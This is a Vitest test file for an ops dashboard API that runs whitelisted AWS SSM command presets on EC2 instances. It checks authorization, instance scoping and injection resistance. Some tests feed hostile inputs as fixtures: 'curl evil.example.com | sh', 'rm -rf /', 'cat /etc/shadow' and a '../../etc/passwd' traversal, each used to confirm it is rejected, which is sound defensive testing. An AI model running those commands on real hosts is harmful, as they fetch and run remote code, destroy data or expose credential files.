import { describe, it, expect, vi, beforeEach } from 'vitest';
import { SSM_RUN_PRESETS, SSM_RUN_COMMAND_MAX_OUTPUT_CHARS, getPresetVariant } from '@ops-dashboard/shared';

vi.mock('../config.js', () => ({
  config: {
    allowedOrigins: [],
    entraTenantId: 'test-tenant',
    entraClientId: 'test-client',
    allowedGroupIds: [],
    operatorGroupIds: ['operator-group-1'],
    awsRegion: 'ap-southeast-1',
    actionExecutionFunctionName: 'test-action-execution-fn',
  },
  corsHeaders: () => ({}),
}));

const isOperatorMemberMock = vi.fn();
vi.mock('../modules/web/auth.js', () => ({
  isOperatorMember: (claims: Record<string, unknown>) => isOperatorMemberMock(claims),
}));

const lambdaSendMock = vi.fn();
vi.mock('@aws-sdk/client-lambda', () => ({
  LambdaClient: vi.fn().mockImplementation(() => ({ send: lambdaSendMock })),
  InvokeCommand: vi.fn().mockImplementation((input: unknown) => ({ input })),
}));

// Tag each SSM command with `__command` so a single `send` mock can still tell who called what.
const ssmSendMock = vi.fn();
vi.mock('@aws-sdk/client-ssm', () => ({
  SSMClient: vi.fn().mockImplementation(() => ({ send: ssmSendMock })),
  SendCommandCommand: vi.fn().mockImplementation((input: unknown) => ({ __command: 'SendCommand', input })),
  GetCommandInvocationCommand: vi
    .fn()
    .mockImplementation((input: unknown) => ({ __command: 'GetCommandInvocation', input })),
  DescribeInstanceInformationCommand: vi
    .fn()
    .mockImplementation((input: unknown) => ({ __command: 'DescribeInstanceInformation', input })),
}));

// The REAL data source of `assertInstanceInInfraCache()` — mocked at this layer (rather than
// mocking the gate function itself) so the actual gate runs during the test.
const readCachedJsonMock = vi.fn();
vi.mock('../shared-kernel/s3Cache.js', () => ({
  readCachedJson: (key: string) => readCachedJsonMock(key),
}));
const getInfraDataMock = vi.fn();
vi.mock('../modules/infra/infra-service.js', () => ({
  getInfraData: () => getInfraDataMock(),
}));

const { handler: runCommandHandler } = await import('../modules/ec2-management/actions-run-command.js');
const { handler: statusHandler } = await import('../modules/ec2-management/get-run-command-status.js');
const { runSsmPreset } = await import('../modules/ec2-management/ssm-run-command-action-service.js');
const { getRunCommandStatus } = await import('../modules/ec2-management/ssm-run-command-status-service.js');

const IN_SCOPE_INSTANCE = 'i-0123456789abcdef0';
const OUT_OF_SCOPE_INSTANCE = 'i-0fedcba987654321';
const COMMAND_ID = '11111111-2222-4333-8444-555555555555';

function buildPostEvent(body: unknown): any {
  return {
    headers: {},
    rawPath: '/actions/run-command',
    requestContext: { http: { method: 'POST' } },
    body: JSON.stringify(body),
  };
}

function buildStatusEvent(instanceId: string): any {
  return {
    headers: {},
    rawPath: `/actions/run-command/${COMMAND_ID}/status`,
    requestContext: { http: { method: 'GET' } },
    queryStringParameters: { instanceId },
  };
}

/** The real payload sent to action-execution-fn, decoded from InvokeCommand's argument. */
function invokedRequest(): any {
  const command = lambdaSendMock.mock.calls[0][0] as { input: { Payload: Buffer } };
  return JSON.parse(Buffer.from(command.input.Payload).toString('utf-8'));
}

function sentCommandInput(): any {
  const call = ssmSendMock.mock.calls.find((c) => (c[0] as { __command: string }).__command === 'SendCommand');
  return (call?.[0] as { input: unknown } | undefined)?.input;
}

beforeEach(() => {
  isOperatorMemberMock.mockReset();
  lambdaSendMock.mockReset();
  ssmSendMock.mockReset();
  getInfraDataMock.mockReset();
  readCachedJsonMock.mockReset();
  readCachedJsonMock.mockResolvedValue({ ec2: [{ instanceId: IN_SCOPE_INSTANCE }] });
});

describe('POST /actions/run-command', () => {
  it('throws 403 when claims are NOT in the operator group — BEFORE any side effect', async () => {
    isOperatorMemberMock.mockReturnValue(false);

    await expect(
      runCommandHandler(buildPostEvent({ presetId: 'disk-usage', instanceId: IN_SCOPE_INSTANCE }), { sub: 'user-1' }),
    ).rejects.toMatchObject({ statusCode: 403 });
    expect(lambdaSendMock).not.toHaveBeenCalled();
    expect(readCachedJsonMock).not.toHaveBeenCalled();
  });

  it('throws 400 when presetId is not in the constant whitelist — costs 0 invokes', async () => {
    isOperatorMemberMock.mockReturnValue(true);

    await expect(
      runCommandHandler(buildPostEvent({ presetId: 'rm-rf-slash', instanceId: IN_SCOPE_INSTANCE }), { sub: 'user-1' }),
    ).rejects.toMatchObject({ statusCode: 400 });
    expect(lambdaSendMock).not.toHaveBeenCalled();
  });

  it('throws 400 when instanceId has an invalid format', async () => {
    isOperatorMemberMock.mockReturnValue(true);

    await expect(
      runCommandHandler(buildPostEvent({ presetId: 'disk-usage', instanceId: 'not-an-instance' }), { sub: 'user-1' }),
    ).rejects.toMatchObject({ statusCode: 400 });
    expect(lambdaSendMock).not.toHaveBeenCalled();
  });

  it('throws 403 when the instance is NOT in the infra cache — costs 0 invokes', async () => {
    isOperatorMemberMock.mockReturnValue(true);

    await expect(
      runCommandHandler(buildPostEvent({ presetId: 'disk-usage', instanceId: OUT_OF_SCOPE_INSTANCE }), {
        sub: 'user-1',
      }),
    ).rejects.toMatchObject({ statusCode: 403 });
    expect(lambdaSendMock).not.toHaveBeenCalled();
  });

  it('still blocks an out-of-scope instance when the S3 cache is empty (Describe fallback, NOT fail-open)', async () => {
    isOperatorMemberMock.mockReturnValue(true);
    readCachedJsonMock.mockResolvedValue(undefined);
    getInfraDataMock.mockResolvedValue({ ec2: [{ instanceId: IN_SCOPE_INSTANCE }] });

    await expect(
      runCommandHandler(buildPostEvent({ presetId: 'disk-usage', instanceId: OUT_OF_SCOPE_INSTANCE }), {
        sub: 'user-1',
      }),
    ).rejects.toMatchObject({ statusCode: 403 });
    expect(lambdaSendMock).not.toHaveBeenCalled();
  });

  it('returns commandId immediately and sends a payload that ONLY contains presetId', async () => {
    isOperatorMemberMock.mockReturnValue(true);
    lambdaSendMock.mockResolvedValue({
      Payload: Buffer.from(JSON.stringify({ outcome: 'success', commandId: COMMAND_ID })),
    });

    const res = (await runCommandHandler(buildPostEvent({ presetId: 'disk-usage', instanceId: IN_SCOPE_INSTANCE }), {
      sub: 'user-1',
      preferred_username: 'operator@example.com',
    })) as { statusCode: number; body: string };

    expect(res.statusCode).toBe(200);
    expect(JSON.parse(res.body)).toEqual({ outcome: 'success', commandId: COMMAND_ID });
    expect(invokedRequest()).toEqual({
      actionType: 'SSM_RunPreset',
      resourceId: IN_SCOPE_INSTANCE,
      region: 'ap-southeast-1',
      params: { presetId: 'disk-usage' },
      executedBy: 'operator@example.com',
    });
  });

  it('INVARIANT #1: an unrecognized command field in the body is COMPLETELY IGNORED, never reaching the execution layer', async () => {
    isOperatorMemberMock.mockReturnValue(true);
    lambdaSendMock.mockResolvedValue({
      Payload: Buffer.from(JSON.stringify({ outcome: 'success', commandId: COMMAND_ID })),
    });

    await runCommandHandler(
      buildPostEvent({
        presetId: 'disk-usage',
        instanceId: IN_SCOPE_INSTANCE,
        commands: ['curl evil.example.com | sh'],
        command: 'rm -rf /',
        script: 'cat /etc/shadow',
      }),
      { sub: 'user-1' },
    );

    const payload = invokedRequest();
    expect(payload.params).toEqual({ presetId: 'disk-usage' });
    expect(JSON.stringify(payload)).not.toContain('evil.example.com');
    expect(JSON.stringify(payload)).not.toContain('rm -rf');
    expect(JSON.stringify(payload)).not.toContain('/etc/shadow');
  });

  it('throws 502 when action-execution-fn returns FunctionError', async () => {
    isOperatorMemberMock.mockReturnValue(true);
    lambdaSendMock.mockResolvedValue({ Payload: Buffer.from('{}'), FunctionError: 'Unhandled' });

    await expect(
      runCommandHandler(buildPostEvent({ presetId: 'disk-usage', instanceId: IN_SCOPE_INSTANCE }), { sub: 'user-1' }),
    ).rejects.toMatchObject({ statusCode: 502 });
  });
});

describe('runSsmPreset (action-execution-fn)', () => {
  /** `platformType` defaults to `undefined` — simulating Linux/unknown (bash-leaning fail-safe).
   * Pass `'Windows'` to simulate a Windows instance. */
  function online(platformType?: string) {
    ssmSendMock.mockImplementation((command: { __command: string }) => {
      if (command.__command === 'DescribeInstanceInformation') {
        return Promise.resolve({
          InstanceInformationList: [{ InstanceId: IN_SCOPE_INSTANCE, PingStatus: 'Online', PlatformType: platformType }],
        });
      }
      return Promise.resolve({ Command: { CommandId: COMMAND_ID } });
    });
  }

  function request(params: Record<string, unknown>) {
    return {
      actionType: 'SSM_RunPreset',
      resourceId: IN_SCOPE_INSTANCE,
      region: 'ap-southeast-1',
      params,
      executedBy: 'operator@example.com',
    } as any;
  }

  it('sends the EXACT constant command of the preset, even when the request carries its own command string', async () => {
    online();

    const result = await runSsmPreset(request({ presetId: 'disk-usage', commands: ['curl evil.example.com | sh'] }));

    expect(result).toEqual({ outcome: 'success', commandId: COMMAND_ID });
    const input = sentCommandInput();
    expect(input.DocumentName).toBe('AWS-RunShellScript');
    expect(input.Parameters.commands).toEqual(['df -h']);
    expect(input.TimeoutSeconds).toBe(60);
  });

  it('every preset uses the correct Linux command declared in SSM_RUN_PRESETS when PlatformType is not Windows', async () => {
    for (const preset of SSM_RUN_PRESETS) {
      ssmSendMock.mockReset();
      online();
      await runSsmPreset(request({ presetId: preset.id }));
      expect(sentCommandInput().DocumentName).toBe('AWS-RunShellScript');
      expect(sentCommandInput().Parameters.commands).toEqual([...preset.linux.commands]);
    }
  });

  it('every preset uses the correct Windows command + AWS-RunPowerShellScript when PlatformType=Windows', async () => {
    for (const preset of SSM_RUN_PRESETS) {
      ssmSendMock.mockReset();
      online('Windows');
      await runSsmPreset(request({ presetId: preset.id }));
      expect(sentCommandInput().DocumentName).toBe('AWS-RunPowerShellScript');
      expect(sentCommandInput().Parameters.commands).toEqual([...preset.windows.commands]);
    }
  });

  it('an unknown/unrecognized PlatformType (e.g. MacOS) still fails safe to AWS-RunShellScript', async () => {
    ssmSendMock.mockReset();
    online('MacOS');

    const result = await runSsmPreset(request({ presetId: 'disk-usage' }));

    expect(result).toEqual({ outcome: 'success', commandId: COMMAND_ID });
    expect(sentCommandInput().DocumentName).toBe('AWS-RunShellScript');
    expect(sentCommandInput().Parameters.commands).toEqual(['df -h']);
  });

  it('rejected when presetId is invalid — SSM is NEVER called', async () => {
    const result = await runSsmPreset(request({ presetId: 'does-not-exist' }));

    expect(result.outcome).toBe('rejected');
    expect(ssmSendMock).not.toHaveBeenCalled();
  });

  it('rejected when the instance is not registered with SSM', async () => {
    ssmSendMock.mockResolvedValue({ InstanceInformationList: [] });

    const result = await runSsmPreset(request({ presetId: 'disk-usage' }));

    expect(result).toMatchObject({ outcome: 'rejected' });
    expect((result as { reason: string }).reason).toContain('AmazonSSMManagedInstanceCore');
    expect(sentCommandInput()).toBeUndefined();
  });

  it('rejected when the SSM Agent is not Online', async () => {
    ssmSendMock.mockResolvedValue({ InstanceInformationList: [{ PingStatus: 'ConnectionLost' }] });

    const result = await runSsmPreset(request({ presetId: 'disk-usage' }));

    expect(result).toMatchObject({ outcome: 'rejected' });
    expect((result as { reason: string }).reason).toContain('ConnectionLost');
    expect(sentCommandInput()).toBeUndefined();
  });

  it('rejected (not failure) when SSM returns InvalidInstanceId', async () => {
    ssmSendMock.mockImplementation((command: { __command: string }) => {
      if (command.__command === 'DescribeInstanceInformation') {
        return Promise.resolve({ InstanceInformationList: [{ PingStatus: 'Online' }] });
      }
      return Promise.reject(Object.assign(new Error('instance not eligible'), { name: 'InvalidInstanceId' }));
    });

    const result = await runSsmPreset(request({ presetId: 'disk-usage' }));

    expect(result).toMatchObject({ outcome: 'rejected' });
  });

  it('failure when SendCommand hits a system error', async () => {
    ssmSendMock.mockImplementation((command: { __command: string }) => {
      if (command.__command === 'DescribeInstanceInformation') {
        return Promise.resolve({ InstanceInformationList: [{ PingStatus: 'Online' }] });
      }
      return Promise.reject(Object.assign(new Error('service unavailable'), { name: 'InternalServerError' }));
    });

    const result = await runSsmPreset(request({ presetId: 'disk-usage' }));

    expect(result).toMatchObject({ outcome: 'failure' });
  });
});

describe('getRunCommandStatus (poll)', () => {
  it('Success is a terminal status and returns stdout verbatim', async () => {
    ssmSendMock.mockResolvedValue({
      Status: 'Success',
      StatusDetails: 'Success',
      ResponseCode: 0,
      StandardOutputContent: '/dev/root  20G  8G  12G  40% /',
      StandardErrorContent: '',
    });

    const status = await getRunCommandStatus(COMMAND_ID, IN_SCOPE_INSTANCE);

    expect(status).toEqual({
      commandId: COMMAND_ID,
      instanceId: IN_SCOPE_INSTANCE,
      status: 'Success',
      statusDetails: 'Success',
      isTerminal: true,
      responseCode: 0,
      stdout: '/dev/root  20G  8G  12G  40% /',
      stderr: '',
      truncated: false,
    });
  });

  it('Failed is a terminal status and preserves stderr + exit code', async () => {
    ssmSendMock.mockResolvedValue({
      Status: 'Failed',
      StatusDetails: 'Failed',
      ResponseCode: 127,
      StandardErrorContent: 'command not found',
    });

    const status = await getRunCommandStatus(COMMAND_ID, IN_SCOPE_INSTANCE);

    expect(status).toMatchObject({ status: 'Failed', isTerminal: true, responseCode: 127, stderr: 'command not found' });
  });

  it('InProgress is NOT terminal yet — the frontend must keep polling', async () => {
    ssmSendMock.mockResolvedValue({ Status: 'InProgress', StatusDetails: 'InProgress' });

    expect(await getRunCommandStatus(COMMAND_ID, IN_SCOPE_INSTANCE)).toMatchObject({
      status: 'InProgress',
      isTerminal: false,
    });
  });

  it('TimedOut is a terminal status, shown verbatim to the operator', async () => {
    ssmSendMock.mockResolvedValue({ Status: 'TimedOut', StatusDetails: 'ExecutionTimeout' });

    expect(await getRunCommandStatus(COMMAND_ID, IN_SCOPE_INSTANCE)).toMatchObject({
      status: 'TimedOut',
      statusDetails: 'ExecutionTimeout',
      isTerminal: true,
    });
  });

  it('InvocationDoesNotExist right after SendCommand → Pending, NOT an error', async () => {
    ssmSendMock.mockRejectedValue(Object.assign(new Error('not found'), { name: 'InvocationDoesNotExist' }));

    expect(await getRunCommandStatus(COMMAND_ID, IN_SCOPE_INSTANCE)).toMatchObject({
      status: 'Pending',
      isTerminal: false,
      stdout: '',
    });
  });

  it('throws 429 when SSM is throttling', async () => {
    ssmSendMock.mockRejectedValue(Object.assign(new Error('slow down'), { name: 'ThrottlingException' }));

    await expect(getRunCommandStatus(COMMAND_ID, IN_SCOPE_INSTANCE)).rejects.toMatchObject({ statusCode: 429 });
  });

  it('truncates output past the threshold and sets the truncated flag', async () => {
    ssmSendMock.mockResolvedValue({
      Status: 'Success',
      StandardOutputContent: 'x'.repeat(SSM_RUN_COMMAND_MAX_OUTPUT_CHARS + 500),
    });

    const status = await getRunCommandStatus(COMMAND_ID, IN_SCOPE_INSTANCE);

    expect(status.truncated).toBe(true);
    expect(status.stdout.length).toBe(SSM_RUN_COMMAND_MAX_OUTPUT_CHARS);
    expect(status.stdout.endsWith('[truncated]')).toBe(true);
  });
});

describe('GET /actions/run-command/{commandId}/status', () => {
  it('throws 403 when claims are NOT in the operator group — output cannot be read', async () => {
    isOperatorMemberMock.mockReturnValue(false);

    await expect(statusHandler(buildStatusEvent(IN_SCOPE_INSTANCE), { sub: 'user-1' }, COMMAND_ID)).rejects.toMatchObject(
      { statusCode: 403 },
    );
    expect(ssmSendMock).not.toHaveBeenCalled();
  });

  it('throws 400 when commandId is not an SSM UUID', async () => {
    isOperatorMemberMock.mockReturnValue(true);

    await expect(
      statusHandler(buildStatusEvent(IN_SCOPE_INSTANCE), { sub: 'user-1' }, '../../etc/passwd'),
    ).rejects.toMatchObject({ statusCode: 400 });
    expect(ssmSendMock).not.toHaveBeenCalled();
  });

  it('throws 403 when the instance is outside the dashboard scope — cannot become an output-reading back door', async () => {
    isOperatorMemberMock.mockReturnValue(true);

    await expect(
      statusHandler(buildStatusEvent(OUT_OF_SCOPE_INSTANCE), { sub: 'user-1' }, COMMAND_ID),
    ).rejects.toMatchObject({ statusCode: 403 });
    expect(ssmSendMock).not.toHaveBeenCalled();
  });

  it('returns 200 with status when valid', async () => {
    isOperatorMemberMock.mockReturnValue(true);
    ssmSendMock.mockResolvedValue({ Status: 'Success', StandardOutputContent: 'ok' });

    const res = (await statusHandler(buildStatusEvent(IN_SCOPE_INSTANCE), { sub: 'user-1' }, COMMAND_ID)) as {
      statusCode: number;
      body: string;
    };

    expect(res.statusCode).toBe(200);
    expect(JSON.parse(res.body)).toMatchObject({ status: 'Success', isTerminal: true, stdout: 'ok' });
  });
});

describe('SSM_RUN_PRESETS (source constants)', () => {
  it('every preset has variants linux=AWS-RunShellScript, windows=AWS-RunPowerShellScript, and a unique id', () => {
    expect(SSM_RUN_PRESETS.length).toBeGreaterThan(0);
    expect(new Set(SSM_RUN_PRESETS.map((p) => p.id)).size).toBe(SSM_RUN_PRESETS.length);
    for (const preset of SSM_RUN_PRESETS) {
      expect(preset.linux.documentName).toBe('AWS-RunShellScript');
      expect(preset.linux.commands.length).toBeGreaterThan(0);
      expect(preset.windows.documentName).toBe('AWS-RunPowerShellScript');
      expect(preset.windows.commands.length).toBeGreaterThan(0);
    }
  });

  it('no preset contains a substitution/interpolation character in either variant — commands are intact constants', () => {
    for (const preset of SSM_RUN_PRESETS) {
      for (const command of [...preset.linux.commands, ...preset.windows.commands]) {
        expect(command).not.toMatch(/\$\{|\{\{|%s/);
      }
    }
  });

  it('getPresetVariant() returns the correct variant by platform for every preset', () => {
    for (const preset of SSM_RUN_PRESETS) {
      expect(getPresetVariant(preset, 'linux')).toEqual(preset.linux);
      expect(getPresetVariant(preset, 'windows')).toEqual(preset.windows);
    }
  });
});
